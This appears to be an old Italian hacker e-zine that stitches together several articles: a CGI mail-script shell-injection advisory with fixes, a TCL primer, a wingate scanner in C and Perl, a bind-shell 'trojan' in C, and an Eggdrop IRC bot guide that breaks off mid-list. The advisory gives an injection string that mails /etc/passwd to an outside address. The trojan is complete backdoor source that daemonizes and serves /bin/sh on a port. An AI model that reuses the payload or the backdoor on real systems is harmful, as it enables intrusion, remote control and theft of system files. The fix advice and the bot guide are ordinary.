Queste nuove vulnerabilita' sono state scoperte da xnec che subito le ha
riportate su buqtraq. 

INFO:
Dopo aver guardato gli script CGI su www.cgi-resources.com,
egli ha scoperto le vulnerabilita' nei seguenti:

1. HAMcards Postcard script v1.0 Beta 2
   (www.hamnetcenter.com)

2. Hot Postal Services v??
   (www.hotarea.com)
   
3. RC Bowen's Postcards v??
   (www.rcbowen.com)

4. LakeWeb's File Mail e Mail List (File Mail esteso) v??
    (www.lakeweb.com)

EXPLOIT:

Ognuno di questi e' explotabile inserendo alcuni caratteri speciali nel box
dell'indirizzo e-mail.
Ogni script chiama qualcosa simile al seguente:

 open( MAIL, "|$mailprog $email" )
 # questa linea proviene dallo script di LakeWeb 

Le stringhe dell'exploit sono semplici, qualcosa come
&mail urkes@hotmail.com < /etc/passwd&@vittima.com andra' bene per ogni script
(i caratteri @vittima.com sono necessari perche' qualche host controlla
 i "@" e i ".") piazzati nel contenitore dell'indirizzo e-mail.

Come risultato, puo' essere eseguito ogni comando da remoto senza un account
locale con l'uid del server web (di solito "nobody" o simili,).

FIX:
O smuovi il tuo processo sendmail, o permetti alcuni caratteri certi;
usa open (MAIL , "|$sendmail -t") o rm -rf ./cgi-bin.

Non possiamo restringere i caratteri permessi da un indirizzo e-mail.
Infatti a sinistra dell'indirizzo e-mail (cioe' a sinistra del @) ,
sono permessi quasi tutti i caratteri speciali.

Possiamo usare anche Net::SMTP per passare i dati direttamente alla porta 25.
Net::SMTP viene installato molto sulle macchine degli ISP.

Anche Mail::Sendmail puo' essere usato solo che e' un sistema un po'
vecchiotto.  Ci sono anche altre vie per ovviare alla missione della ricerca
dei caratteri speciali e della loro distruzione.
Prima cosa, perche' le persone pensano che hanno bisogno di inserire
l'indirizzo del recipiente sulla linea di comando nella prima parte?

   open (MAIL,"| /usr/lib/sendmail -t -oi");
   print MAIL <<END;
   To: $mailto
   From: me (me\@boh.com)
   Subject: niente

   Ciao gente!
   END
   close MAIL;

Ed ecco una tecnica generale in Perl per aprire pipe senza chiamare la shell.

   open (MAIL,"|-") || exec '/usr/lib/sendmail','-t','-oi';
   print MAIL <<END;
   To: $mailto
   From: me (me\@nowhere.com)
   Subject: niente

   Ciao gente!
   END
   close MAIL;

   Spero che questi consigli vi siano utili, bye!

                                                                T0rment0

[############################################################################]

                 -----------------------------------------
                       GUIDA ALLA PROGRAMMAZIONE TCL 
                 -----------------------------------------
                
Vi ricordo che molte cose di questa guida sono facilmente reperibili in
inglese sulla rete, quindi se conoscete l'inglese potete approfondire
l'argomento con un po' di ricerca. Vi prego di scusarmi se gia' conoscete
la materia e notate qualche errore, ma vorrei ricordarvi che programmo
prevalentemente in C e Assembler, e non ho molta pratica di TCL. Detto
cioe' incominciamo con un'introduzione a questo linguaggio...
Ricordiamoci che il linguaggio TCL e'
case sensitive e che tclsh e' una shell contenente un interprete per questo
linguaggio. Uno script tcl e' formato da uno o piu' comandi, ai quali possiamo
passare argomenti nella forma "comando arg1 arg2 ... argn"
Un'altra cosa che bisogna ricordare e' che questo linguaggio e' basato sulle
stringhe come variabili fondamentali quindi se scriviamo "set x y+5" assegnamo
ad x non il valore di y sommato con 5, ma la stringa "y+5".  Per fargli capire
quello che vogliamo dobbiamo in questo caso usare expr: "set x [expr $y+5]"
Da questo esempio avrete gia' capito che set serve a dichiarare e a settare
una variabile : "set variabile valore". Per indicare che intendiamo utilizzare
il valore di una variabile usiamo '$'.  Ad esempio dicendo $y diciamo che
vogliamo il valore della variabile y e non il carattere 'y'.
Se invece vogliamo usare il carattere $ o altri caratteri speciali del
linguaggio possiamo usare '\' come faremmo in un programma C per usare,
ad esempio, il carattere ", utilizzato per indicare l'inizio e la fine
delle stringhe. Un comando fondamentale che potete usare per verificare
se tutte ste cazzate che vi sto dicendo funzionano e' puts. Se volete
provare a visualizzare il valore di x usate ad esempio "puts stdout $x" (non
penso di dover spiegare cos'e' stdout....)
E' possibile usare if while e for utilizzando la solita convenzione C di
racchiudere i blocchi entro parentesi graffe.

if {$x==$y}{

	set $x 0
	set $y 10
}

Gli operatori sono i soliti, <, >, <=, >=, ==, !=, etc.
Ok, questa voleva essere un'introduzione, la prossima volta ci
addentreremo un po' di piu' in questo campo, per ora scusatemi se
ho detto cazzate. byeZ :)
	
                                                       Techno Knight
                                                    (techno83@freemail.it)

[############################################################################]

             -------------------------------------------
                   COSTRUIAMOCI UN WINGATE SCANNER
             -------------------------------------------

Volete che io vi aiuti a scrivere un wingate scanner? Hmmm
Azz volete anche che vi spieghi un po' di teoria riguardo la programmazione?
Ma per chi mi avete preso? Vabbe giusto perche' siamo sotto natale vi
accontento :)

Prerequisiti: Conoscenza almeno di base del C
Postrequisiti: Una beata mazza!
Saluto: visto che non saluto mai nessuno in ogni articolo, stavolta voglio
        autosalutarmi...ciao t0rm!
Fanculo: Basta che guardiate alla fine dell'ezine!

Di solito quando si tratta di programmi che gestiscono i socket non in
modalita' grezza (raw) vengono specificate sempre queste librerie:

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

Servono per la comunicazione SOCK_STREAM che si basa sul protocollo TCP.
Vediamo i contenuti di ognuna:
Nella prima sono specificati alcuni tipi di file speciali.
Nella seconda sono specificati tutti i comandi via socket.
Nella terza sono definiti i protocolli IP standard, le porte standard, i bit 
degli indirizzi(di memoria o mask) interi di internet, alcuni dati strutturati
sui socket, i comandi per passare dal sistema numerico del nostro pc a quello 
della comunicazione via TCP.
Nella quarta sono specificati i comandi per convertire da un sistema di 
caratteri ad un altro.
Nel quinto sono specificate alcune strutture per i socket e comandi per la 
gestione dell'IP.

E' un inghippo eh? Beh all'inizio puo' sembrare difficile ma una volta 
assimilate non vi troverete in difficolta' quando dovrete usare delle
determinate funzioni contenute nelle librerie.

//Come prima cosa specifichiamo le librerie che servono al nostro prog:

#include <arpa/inet.h>
#include <netdb.h>

//Poi dichiaramo una costante nella quale inseriremo il valore della nostra
//porta. In questo caso e' 23.

#define PORTAGATE 23

//Possiamo iniziare con il main e la dichiarazione delle strutture che andremo a
//riempire poi con l'IP, la porta ed altre informazioni.

int main(int argc, char **argv)
{
 struct hostent *host;
 struct in_addr indirizzo;
 struct sockaddr_in z;
 u_char *buf[300]; //qui sara' contenuta la schermata che cattureremo dal server
 int p; //questa invece e' la variabile del socket

 if (argc==1) //Stampo un menu' se l'argomento non e' stato specificato
  {
   printf ("\nSemplice wingate scanner\n");
   printf ("Derivato da una perdita di tempo di T0rment0\n");
   printf ("Usalo in questo modo: %s <host>\n\n", argv[0]);
   exit(1);
  }

 //Ora dobbiamo ricavare alcune informazioni dal server e riempire la 
 //struttura host
 host=gethostbyname(argv[1]);
 if (!host) exit(1);
 bcopy (host->h_addr, &indirizzo, sizeof (struct in_addr));

 //Possiamo proseguire con la creazione del socket
 p=socket(z.sin_family=2,1,IPPROTO_TCP);

 //Inseriamo la porta ricavata 
 z.sin_port= htons(PORTAGATE);

 //Qui uso un comando che serve a convertire l'ip nel formato TCP
 z.sin_addr.s_addr=inet_addr(inet_ntoa(indirizzo));

 //Ora che abbiamo inserito tutte le info ci andiamo a connettere
 if (connect(p,&z,sizeof(z)) == -1) {
  perror("Connect()"); }
 
 alarm(6); //Avviene un time out dopo 6 secondi

 //Ricavo la schermata del server e la inserisco in buf
 read(p,buf,255);
 
 //Vedo se in buf e' presente la stringa 'Wingate>' e stampo l'host
 if (strstr (buf, "Wingate>"))
  printf (" L'host %s e' un Wingate\n",inet_ntoa(indirizzo));
 
 //E' ovvio che dobbiamo lasciare un ricordino
 write(p,"Ciaoz\n",6);
 
 //Chiudiamo il socket
 close(p);
}

Ok ed ecco il nostro wingate scan pronto per l'uso!
Voi: Ma cacchio posso controllare solo un host?
Io: Si e non me ne puo' fregar di meno!
Voi: Ma cacchio io non so come si fa a scannerizzare un'intera subnet
Io: Mizzeca e come state 'nguaiati! :) No no e no!
Voi: Ti mando una confezione di pandoro con lo spumante in allegato ma ti 
     nascondo gli header.
Io: Ok! :) Tanto alla fine sempre vi rintraccio e mi lamentero' del fatto che
    il pandoro non era Bauli!

Okok la finisco :(
Ora ci costruiamo uno script e stavolta per capire dovrete applicarvi da
soli!

#!/usr/bin/perl -w
#Questo script fa lo scan di una subnet C, pero' non vede se un host
#e' attivo o meno...sta a voi implementare questa funzione!.
#Sintassi  ./wgatescan [aaa.bbb.ccc] [fileoutput]

$RETE = $ARGV[0];
$INIZIO=1;
$FINE=254;
$FILE=$ARGV[1];

while ($INIZIO < $FINE) {
  $HOST ="$RETE.$INIZIO";
  print `./wgate $HOST >> $FILE`;
  $INIZIO = $INIZIO + 1;
}

Allora accontentati? Spero di si altrimenti la prossima volta passero'
alla piattaforma POSIX :) Il sorgente e lo script possono essere modificati a 
vostro piacimento, ma ricordatevi di andare avanti non indietro :)

								T0rment0

[############################################################################]

                      ----------------------------------
                            IL TROJAN PIU' VECCHIO
                      ----------------------------------


Probabilmente e' uno dei trojan piu' vecchi mai creati, probabilmente
e' stato il primo...chissa'! Quanti di voi non conoscono quel programmino
per linux che mette la shell in ascolto su una porta predefinita?
Tutti quelli che hanno risposto io si leggano tutti i libri in inglese
di Richard Stevens (grande perdita nel mondo di internet), poi vadino
su packetstorm, rootshell e securityfocus e si leggano l'altrettanto
allietante documentazione. Alla fine chi ha fatto cio' puo' continuare a
leggere. Quella che trovate qui sotto e' una mia versione che potrete
modificare e ampliare a vostro piacimento:

------COMINCIA A TAGLIARE------shellonport.c------

/* Th15 PR0G 15 0NLY F0R M3N! 1 J0K3. D0NT F0RG3T TH4T 3V3RY C0MM4ND
MU5T F1N15h W1TH ";" . 4 3X4MPL3: "ls -al;" or "rm -rf;"
C0D3D 8Y T0rment0 8UT TH3 1D34 15 0LD35T TH4N H1M!
TH15 15 3NGL15H 8UT TH3 C0MM3NT R 1N 1T4L14N. 50RRY :)
*/

#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#define PORT 636261 //Qui inseriamo la porta di ascolto

//Dichiarazione di variabili e strutture per la gestione dei socket
int s, sclient, lungh_sock, server_pid, client_pid;
struct sockaddr_in ind_serv; 
struct sockaddr_in ind_client;
//Main
int main () 
{ 
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Creazione del socket 
    if (s == -1) 
        exit(-1); 
    bzero((char *) &ind_serv, sizeof(ind_serv));
    //Riempiamo i parametri del socket
    ind_serv.sin_family = AF_INET; 
    ind_serv.sin_addr.s_addr = htonl(INADDR_ANY); 
    ind_serv.sin_port = htons(PORT);
    //Se la porta e' gia' in uso avviene un errore
    if (bind(s, (struct sockaddr *) &ind_serv, sizeof(ind_serv)) ==-1) {
      perror("bind()");
      exit(-1);
    }
    //Se non riesce a generare un clone del processo, esce
    if (fork() != 0) 
        exit(0); 
    setpgrp();  
    signal(SIGHUP, SIG_IGN); 
    if (fork() != 0) 
        exit(0);
    //Mettiamo il server in ascolto con numero massimo di connessioni = a 5
    if (listen(s, 5) ==-1) {
      perror("listen()");
      exit(0);
    }
    while (1) { 
        lungh_sock = sizeof(ind_client);
        //Non restituisce il controllo finche' non c'e' una connessione
        sclient = accept(s, (struct sockaddr *) &ind_client, &lungh_sock);
        if (sclient < 0) 
            exit(0); 
        client_pid = getpid(); //Ricava i permessi del client
        server_pid = fork(); //Genera un clone del processo
        if (server_pid != 0) { 
            dup2(sclient,0); 
            dup2(sclient,1); 
            dup2(sclient,2);
            execl("/bin/sh","sh",(char *)0); //Mette in ascolto il prog sh
            close(sclient); 
            exit(0); 
        } 
    close(sclient); //Chiude il socket 
    }
}

------CAZZ SMETTI DI TAGLIARE------

Beh da come avete visto realizzare un trojan per unix e' molto piu' facile
che da windows e non richiede nemmeno grandi conoscenze ma solo un po' di
buona volonta' e, soprattutto, Linux!
(ndT0rm: Ehi t0rm sei propio 'ndelligente! Ma o sai che se po fa a stessa
cosa per wincazz? Noo?? Beh basta che metti er command.com in ascorto su una
porta ed er gioco e' fatto!). cIAUZ!

                                                                T0rment0

[############################################################################]
[---------------------------------IrcwaR-------------------------------------]
[############################################################################]

                       
                         [------------------------]
                         [ GuidA AL BoT EggDroP   ]
                         [------------------------]
                         [ ScrittO DA UnD3rK00L   ]
                         [------------------------]
                         [ und3rk00l@cybergal.com ]
                         [------------------------]


--[ Note ]--
Questa guida e' stata scritta da un chatter qualsiasi quindi se avete delle
imperfezioni da segnalarmi o vorrete esortarmi a convertirmi al Buddismo
e-mailatemi a und3rk00l@cybergal.com. Questo tutorial e' stato scritto da un
membro dei BooZeD ToXiN, quindi significa che la responsabilita' e' affibbiata
a loro e se dovessi farmi male scrivendo questa guida, mi paga la loro
assicurazione ;p
        
--[ Contenuti ]--
Cos'e' un EggDrop?
Di cosa ho bisogno per eseguirlo?
Dove posso prenderlo?
Come lo setto?
Comandi di base
Suggerimenti per gli user
Suggerimenti per i canali
Collegare i bot
Cos'e' il TCL e cosa ha a che fare con gli eggdrop?
Trucchetti
Bibliografia

--[ Cos'e' un eggdrop? ]--

   Nota: Questo e' preso dalla guida dell'Eggdrop 1.3.28

L'Eggdrop e' un bot per IRC, scritto in C. Se non conoscete cos'e' IRC,
questo non e' sicuramente il documento da leggere! L'Eggdrop, essendo
un bot, si mette su un canale e puo' servire per:
prendere misure protettive per mantenere il canale dai continui take over
(in pochi casi si puo' fare qualcosa),
per riconoscere gli utenti bannati e rigettarli fuori,
per riconoscere gli utenti privilegiati e lasciare che si prendano l'op.
ecc. ecc.

Una delle molte e uniche opzioni dell'eggdrop e' la sua "partyline",
accessibile via DCC chat, che vi permette di parlare con le altre persone
liberi da lag del server irc. Consideratela una multi DCC chat, o un IRC in
miniatura. Potete linkare i bot ed espandere la partyline finche' non diventa
abbastanza grande come IRC :)

--[ Di cosa avete bisogno per eseguirlo? ]--

Per eseguire un eggdrop avete bisogno di un po' di cose:
 * Alcuni account unix (sia un accesso locale ad un server, sia un account
   remoto, che vi servira' per eseguire il vostro bot e per mantenere i
   processi attivi anche dopo il log out)
 * Una piccola ma buona conoscenza di IRC e Unix, inclusa quella della DCC.
 * Circa 500k di spazio su disco, o di piu', dipende dal vostro sistema
   (su Linux l'eseguibile occupa circa 400k -- sara' un po' piu' grande sui
    sistemi RISC)
 * Le librerie TCL (lib files), che si possono trovare su www.linuxberg.com

Se volete tenere su il vostro bot 24 ore su 24 avete bisogno appunto di un
server che stia online 24 ore su 24 (finche' non lo fate sul vostro pc...
in quel caso dovete darmi una shell senza restrizioni prima di continuare a
leggere questo documento...;) ). Potete ottenere qualche shell comprandovela o
baciando l'amministratore che per allontanarvi ve ne regalera' una :)
(nessuna shell appartenenti a quelle 'free' vi permette di mettere dei bot
quindi non iniziate a fare progetti senza coda). Ci sono molti provider che
vi danno shell, uno di questi e' www.foonet.net.

Ora alla parte TCL:

Prima di compilare un bot, dovete avere installata la libreria TCL sul pc.
Molti sistemi l'hanno gia' installata -- potete controllare digitando il
comando 'tclsh'.  Se funziona, avrete un prompt contrassegnato da un "%",
ed ora potete digitare 'exit' per tornare alla shell normale.
Cio' significa che il vostro sistema ha le TCL installate.
Se invece non funziona, e' probabile che non le avete installate. Quindi
andate su quel sito di prima, le scaricate e le installate.
Anche questo FTP non e' niente male per scaricarvele:
   ftp://ftp.scriptics.com/pub/tcl

La miglior versione al momento e' la 8.0.4. Ma anche la 7.6p2 e' buona
per il nostro scopo.

Se comprate la shell e sapete che lasciano la messa online di bot (questa
parte importante dovrebbe essere scritta in qualche paragrafo delle regole da
seguire presentate all'atto del contratto)
potete completamente essere sicuri che le abbia installate.
                                                          
Prima di iniziare, domandatevi se avete veramente bisogno di un bot.
Molti server irc permettono solo un numero limitato di bot.
La reazione?  Molte persone eseguono i bot come giocattoli o come programmi
di guerra. Se volete usare l'eggdrop per scopi distruttivi, andate via
e cancellate subito questa directory.

Mettetevi subito in cerca di un server che vi permette l'esecuzione di bot
Se usate un ISP (Internet Service Provider) che possiede il suo server IRC
controllate i bot per essere sicuri che vadino bene. Se vorrete usare un
server diverso apprestatevi a leggere il suo motd (Message Of The
Day) e verificate la loro 'policy'.  Seguendo le regole i vostri bot verranno
subito accettati.

Parlando in generale, avete bisogno di un bot su EFnet se il vostro canale
ha un costante numero alto di utenti (24 ore al giorno) e nessun bot.
Se il vostro chan ha gia' un gruppo di bot, e' probabile che non vi servira'.
Molti bot non fanno niente di buono, e occupano solo il chan.
Su Undernet probabilmente non avrete mai bisogno di piu' di un bot per chan.
Notate anche che generalmente, non e' accettabile usare un bot per mantenere
aperto un chan quando non e' in uso. Comunque, le regole cambiano da server a
server, cosi' guardatevi intorno prima di continuare. Se il vostro canale
e' estremamente ampio vi servira' una botnet (insieme di bot linkati tra loro)

--[ Dove posso prenderlo? ]--

L'Eggdrop puo' essere scaricato da vari siti intorno al mondo. Eccone alcuni:
Il sito ufficiale: ftp.eggheads.org.
    I mirrors correnti sono:
      ftp.de.eggheads.org
      ftp.fr.eggheads.org
Io raccomando anche il sito ftp.apolloweb.net (Dir: /pub/files/) perche' e'
molto veloce. (Se scaricate l'eggdrop da una shell, questo sito vi fara'
arrivare i dati alla velocita' di 100k al secondo, visto che di solito le
shell hanno un collegamento veloce)

Abbiamo 3 versioni principali dell'eggdrop: 1.1.5, 1.3.X, 2.0
Prima di tutte, la 2.00 fa schifo. A parte qualche file help, la sua
compilazione puo' essere difficile e non si differenzia molto dalla 1.3.X
La 1.1.5 viene acclamata come una delle piu' stabili, ma molti script TCL
(Guarda dopo) sono codificati per l'1.3.X, cosi' io raccomando l'uso della
1.3.X. Quindi tutte le informazioni in questo tutorial riguarderanno la
versione EggDrop1.3.X.

--[ Come lo setto? ]--

Ok...
Prima di tutto, collegatevi alla vostra shell e scaricatevi l'EggDrop usando
l'FTP. (Potete anche uploadarlo voi ma con il primo metodo si va piu' veloci)

Ora scrivete questi comandi:

gunzip eggdrop1.3.27.tar.gz
tar xf eggdrop1.3.27.tar
cd eggdrop1.3.27
./configure

Ok
eggdrop1.3.27 si riferisce al nome file del bot. Dipende dal sito e dalla
versione che avete scaricato. Puo' anche chiamarsi eggdrop1.3.23.tgz, in quel
caso usate i seg. comandi:                                                    

gunzip eggdrop1.3.23.tgz
tar xf eggdrop1.3.23.tar
cd eggdrop1.3.23
./configure

Dopo aver scritto ./configure dovrete aspettare. Questo controllera' se e'
possibile eseguire l'eggdrop su quel sistema o no. Se si finisce senza errori
vi tocca scrivere:

make

Questo costruira' il pacchetto eggdrop. Se si finisce con nessun errore,
potete iniziare a cotruire il file di configurazione. Il file di
configurazione e' un insieme di linee che definiscono varie opzioni come
il nick del bot, il server e cosi' via
...

Ecco un esempio di un facile uso di file di configurazione .
Dovrete copiarvi tutto da ### Start ###' a '### End ###'
dentro al file e poi uploadarlo alla shell dandoci il nome di
bot.conf o eggie.conf o come volete :-)

#######################
###      Start      ###
#######################
### Modifica da qui:###
#######################

# IDENT del bot
set username "deo"
# Padrone/i e master/s del Bot 
set admin "un3rK00l"
# rete irc del bot
set network "IRCnet"
# La porta telnet che il bot aprira' per le connessioni entranti
listen 2000 all
# Padrone/i e Master/s del bot
set owner "und3rk00l"
# NickName del bot
set nick "4|\/|3D30"
# Nickname alternativo
set altnick "M||\|GH|4"
# Nome reale del bot
set realname "Gioggio Ammani"
# Il canale statico del bot. puoi specificare solo un canale qui.
set confchan "#Bots"
# I servers IRC del bot
set servers {
  irc.flashnet.it
  irc.stealth.net
  irc.anet.com
  irc.stud.unipg.it
  irc.funet.fi
}

##################################################################
##################################################################
###### !!!      Qui cambiate solo se siete esperti     !!! #######
##################################################################
##################################################################

set timezone "EST"
set max-logs 5
set log-time 1
set keep-all-logs 0
set console "mkcobxs"
logfile mkco * "$nick.log"
set userfile "$nick.user"
set sort-users 0
set help-path "help/"
set temp-path "/tmp/"
set motd "motd"
set protect-telnet 0
set dcc-sanitycheck 0
set ident-timeout 30
set require-p 1
set open-telnets 0
set connect-timeout 15
set dcc-flood-thr 3
set telnet-flood 5:5
set resolve-timeout 15
set ignore-time 15
set debug-output 0
set hourly-updates 00
set notify-newusers "HQ"
set default-flags "fv"
set whois-fields "url"
set remote-boots 2
set share-unlinks 1
set die-on-sighup 0
set die-on-sigterm 0
#unbind dcc n tcl *dcc:tcl
#unbind dcc n set *dcc:set
unbind dcc n simul *dcc:simul
set max-dcc 50
set enable-simul 1
set allow-dk-cmds 1
set mod-path "./"
loadmodule channels
set chanfile "$nick.chan"
set ban-time 10
channel add $confchan {
  chanmode "+nt"
  idle-kick 0
  flood-chan 4:6
}
channel set $confchan -clearbans -enforcebans +dynamicbans +userbans -autoop -b
itch -greet +protectops -statuslog -stopnethack -revenge +autovoice -secret -sh
ared -cycle
set share-greet 0
set use-info 1
loadmodule server
set keep-nick 1
set strict-host 0
set quiet-reject 1
set lowercase-ctcp 0
set answer-ctcp 3
set flood-msg 5:5
set flood-ctcp 3:5
set never-give-up 1
set strict-servernames 0
set default-port 6667
set server-cycle-wait 60
set server-timeout 15
set servlimit 0
set check-stoned 1
set use-console-r 0
set serverror-quit 1
set max-queue-msg 300
set trigger-on-ignore 0
set use-silence 0
set handle-mode_r 0
loadmodule ctcp
loadmodule irc
set bounce-bans 0
set allow_desync 1
set kick-method 1
set kick-bogus 1
set learn-users 1
set wait-split 300
set wait-info 180
set modes-per-line 3
set mode-buf-length 200
set use-354 0
#unbind msg - ident *msg:ident
set no-chanrec-info 0
loadmodule transfer
set max-dloads 3
set dcc-block 0
set copy-to-tmp 1
set xfer-timeout 300
loadmodule share
set resync-time 900
#set private-owner 0
#set private-global 0
#set private-globals "mnot"
#set private-user 0

#loadmodule filesys
set files-path "/home/mydir/filesys"
set incoming-path "/home/mydir/filesys/incoming"
set upload-to-pwd 0
set filedb-path ""
set max-file-users 20
set max-filesize 1024
loadmodule notes
set max-notes 50
set note-life 60
set allow-fwd 0
set notify-users 1
set console-autosave 1
set force-channel 0
set info-party 0
loadmodule seen
checkmodule blowfish
#loadmodule assoc
source scripts/alltools.tcl
source scripts/action.fix.tcl
source scripts/userinfo1.0.tcl
loadhelp userinfo.help

#######################
###       End       ###
#######################

OK!
Dopo aver modificato la prima parte del file, dovete uploadarlo alla shell.
Il file deve essere nella directory del bot (Es. ./eggdrop1.3.27/)
Ora potete eseguirlo. Per far cio' dovrete scrivere dalla vostra shell, cio':

./eggdrop -m bot.conf

dove bot.conf e' il nome del vostro file di configurazione.

Nota: La prossima volta che eseguirete il bot (se va giu', per esempio),
non dovrete specificare l'opzione '-m'.

Ora eseguite un client IRC per connettervi al server irc del bot,
entrate nel suo canale e aspettate che entri.
Quando lo vedete apparire scriveteci hello in query (/msg Suonick hello).
Cosi' esso vi dira di settare una password. Fatelo scrivendoci in query
'pass password' (/msg suonick pass miapassword). Rimpiazzate la parola
miapassword con la vostra password.

--[ Comandi di base ]--

Molti comandi sono spediti al bot via DCC chat. Dopo esservi fatti riconoscere
dal bot, potete inziare a scrivere i vostri comandi.
Tutti i comandi nella DCC chat iniziano con un '.'.
Nota
I: Alcuni comandi richiedono differenti livelli d'accesso. Spieghero' dopo.
II: Se otterrete il messaggio "Unknown command" e' probabile che il vostro
livello d'accesso e' troppo basso.

Un parametro nelle <> non e' un opzione, mentre in [] e' un opzione.

.help [comando] - Vi mostra la schermata d'aiuto. Esempio: .help help
.bots - Vi mostrera' una lista dei bot connessi. (Gli eggdrop possono essere
connessi ad altri bot. Vedremo dopo)
.status - Vi mostrera' alcuni stati del bot.
.whois <qualcosa> - Vi dara' info su <qualcosa>. Esempio: .whois und3rk00l
.jump <server> - Connettera' il bot ad un server specifico. Esempio: .jump
 irc.anet.com
.+user <qualcosa> <dominio> - Aggiungera' un utente al bot. Esempio: .+user
 und3rk00l und3rk00l!yo@*.it
.-user <qualcosa> - Rimuovera' l'user dal bot. Esempio: .-user und3rk00l
.+host <qualcosa> <dominio> - Aggiungera' <dominio> a <qualcosa>. Esempio:
  .+host und3rk00l *!*@*.tin.it
.-host <qualcosa> <dominio> - Rimuovera' <dominio> da <qualcosa>. Esempio:
  .-host und3rk00l *!*@*.tin.it
.+chan <#Canale> - Fara' entrare il bot su <#Canale>. Esempio: .+chan #xj
.-chan <#Canale> - Fara' uscire il bot da <#Canale> . Esempio: .-chan #xj
.chanset <#Canale> <Settaggio> [Valore] - Settera' un attributo specifico del
 canale (vedi dopo). Esempio: .chanset #xj +autoop o esempio 2: .chanset #xj
 flood-chan 5:60
.chattr <qualcosa> <flags> [Canale] - Dara' a <qualcosa> i flags globali
 <flags> o del [Canale] . Esempio: .chattr und3rk00l +o Esempio 2: .chattr
 und3rk00l +f #xj 
.die [motivo] - Uccidera' il bot
.save - Fara salvare al bot il suo database (si fa anche in automatico)
.rehash - Forzera' il bot a ricaricare il suo file di configurazione
.reload - Forzera' il bot a ricaricare il suo file del canale
.restart - Fara' ripartire il bot
.+bot <bot><host:porta> - Aggiungera' un bot al database per creare una botnet
 (Vedi dopo). Esempio: .+bot Minghia shelluzz.com:4556
.-bot <bot> Rimuovera' <bot> dal database
.botattr <bot> <flags> - e' come .chattr ma con i bot
.link <bot> - Fara' in modo che il tuo bot si linki con <bot>
.unlink <bot> - Forzera' il bot a fermare il link con <bot>
.chpass [nick] <pass> - Cambiera' la tua pass o quella di [nick] se hai
 accesso a cambiare le password di altri utenti.
.nick <nuovonick> - Cambia il tuo nick nella partyline. (vedi dopo)
.op <nickname> <canale> - Oppera' <nickname> in <canale>. Esempio: .op
 Und3rk00l #xj
.voice <nickname> <canale> - Dara' VOICE a <nickname> in <canale>. Esempio:
 .voice Und3rk00l #xj

Questo e' tutto per ora.... Molti comandi sono nel prossimo capitolo (o nella
documentazione dell'Eggdrop)
Un'altra bella opzione degli Eggdrop e' la partyline.
Essa permette ad utenti multipli di parlare in un'unica dcc chat.
Ogni cosa che direte senza il '.' sara' visto da tutti gli utenti in partyline

--[ Suggerimenti per gli utenti ]--

Qualche volta vi capitera' di voler aggiungere un utente al bot.
Qui vi descrivero' come aggiungere utenti e come settare il loro accesso.

Per aggiungere un utente:
.+user <qualcosa> <dominio>

<qualcosa> e' l'username dell'user. E' la stessa cosa del nickname ma e'
limitato a 9 caratteri.
<dominio> e' il dominio che l'utente usera' per farsi riconoscere. Potete
sempre aggiungere e rimuovere domini usando .+host e .-host nella partyline.

Dopo dovete settare per ogni utente i flag per l'accesso globale.
Per far cio' scrivete .chattr <qualcosa> <flags>
<qualcosa> e' l'user che avete digitato quando avete aggiunto un utente
e <flags> sono i flags dell'utente.
Setteranno il loro accesso.Eccone una lista.

      o   global op (il bot oppera' questo utente su ogni canale)
      m   master (l'utente e' il master del bot)
      n   owner (l'utente e' il possessore del bot)
      t   botnet master (l'utente e' il master della botnet)
      x   xfer (l'utente ha accesso sull'area file)
      j   janitor (l'utente e' un master dell'area file)
      p   party-line (l'utente ha accesso alla party-line)
      c   common (l'utente registrato e' un sito di comune accesso) 
      u   unshared (non spedito a condividere con gli altri bot)
      b   bot (l'utente e' un altro bot)
      d   global deop (l'utente  non puo' prendere l'op)
      k   global auto-kick (l'utente viene kickato & bannato automaticamente)
      f   global friend
      v   global voice(l'utente assume +v automaticamente sui chan +autovoice)
      a   global auto-op (oppa sempre questo utente quando entra)
    
   ogni canale dove e' entrato un utente avra' un record specifico per esso,
   con i flags specifici per canale e la possibilita' di un info line.
   I flags specifici dei canali sono:

      m   master (l'utente e' un master del canale)
      n   owner (l'utente e' un owner per il canale)
      o   op (il bot dara'l'op all'utente)
      d   deop (i bot non lasciano che questo utente diventi op)
      f   friend (l'utente non e' punito se fa strane cose)
      k   kick (l'utente e' auto-kikkato)
      v   global voice (l'utente prende +v automaticamente su chan +autovoice)
      q   global quiet (l'utente non prende mai +v sui chan +autovoice)
      a   global auto-op (oppa sempre questo utente quando entra)
    
Ecco questo e' un esempio che vi mostra come aggiungere un utente global op
al bot e dargli anche la +n (owner) su #xj:

.+user und3rk00l und3rk00l!*@*.tin.it
.chattr und3rk00l +o
.chattr und3rk00l +n #xj

Dopo cio', l'utente dovra' settarsi una password. Puo' farlo mandando una
query al bot con 'PASS password' 
/msg Bot pass kazz (per esempio)

Ok, ora e' addato!
Ora se vorrete rimuoverlo digitate: .-user <qualcosa> ed esso sara' cancellato.


--[ Suggerimenti per il canale ]--

Questa sezione si riferisce ai comportamenti del canale.

Per far entrare un bot in un canale dovete scrivergli nella DCC chat:
.+chan #Canale
Per lasciare #Canale
.-chan #Canale
Per settare qualcuno come owner(possessore) del canale:
.chattr Nick +n #Canale
Se vorrete recuperare qualche informazione dal canale, scrivete:
.chaninfo #Canale
Per settare varie opzioni del canale, come il massimo numero di messaggi al
secondo o il massimo numero di deop al secondo.
Scrivete cosi': .chanset #Canale settaggio valore
Settaggi possibili:
 flood-chan (numero:secondi)
   quanti messaggi e in quanti secondi in un canale sono un flood?
   se non si specifica il numero o si mette = a 0 non controllera' 
 flood-ctcp (numero:secondi)
   quanti messaggi cptc in un canale e in quanti secondi sono un flood?
   non specificandolo o usando il numero = 0 non controllera' il cptc flood!
 flood-deop (numero:secondi)
   quanti deops in quanti secondi sono considerati un mass de-op?
   non specificandolo o usando = 0 non ci sara' protezione contro il massdeop!
 flood-kick (numero:secondi)
   quanti kick in quanti secondi sono considerati un mass-kick?
   non specificandolo o usando = 0 non si controllera' il mass kicks!
 flood-join (numero:secondi)
   quanti join e cambiamenti di nick in quanti secondi e' un join flood?
   non specificandolo o usando 0 non si controllera' il flood dei join!

Il formato del valore di solito e' quante volte:quanti secondi.
Per esempio, se vorresti kikkare che deopoa 3 utenti in 10 secondi in #canale
scriverai:
.chanset #Canale flood-deop 3:10
Puoi anche settare le opzioni del canale scrivendo .chanset #Canale +/-opzione
Opzioni disponibili:

clearbans
